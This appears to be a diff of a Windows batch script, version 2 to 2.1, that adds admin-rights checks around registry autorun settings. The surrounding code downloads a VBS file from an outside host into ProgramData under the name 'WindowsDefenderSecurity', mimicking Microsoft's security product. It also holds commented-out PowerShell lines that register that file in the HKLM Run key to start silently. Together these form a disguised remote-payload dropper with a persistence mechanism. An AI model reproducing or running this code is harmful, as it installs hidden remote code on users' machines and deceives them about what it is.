@@ -2,7 +2,7 @@
 setlocal
 cls
 
-set "version=2"
+set "version=2.1"
 
 
 :: check for admin rights
@@ -115,9 +115,13 @@ if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
 :: PC registry
 
 if exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
-    ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-    ::set "pcregistryauto=YES"
-    set "pcregistryauto=NON"
+    if "%AdminRights%"=="true" (
+        ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
+        ::set "pcregistryauto=YES"
+        set "pcregistryauto=NON"
+    ) else (
+        set "pcregistryauto=NON"
+    )
 )
 if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     if "%AdminRights%"=="true" (
@@ -126,6 +130,7 @@ if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs"
         powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
         ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
         ::set "pcregistryauto=YES"
+        set "pcregistryauto=NON"
     ) else (
         set "pcregistryauto=NON"
     )
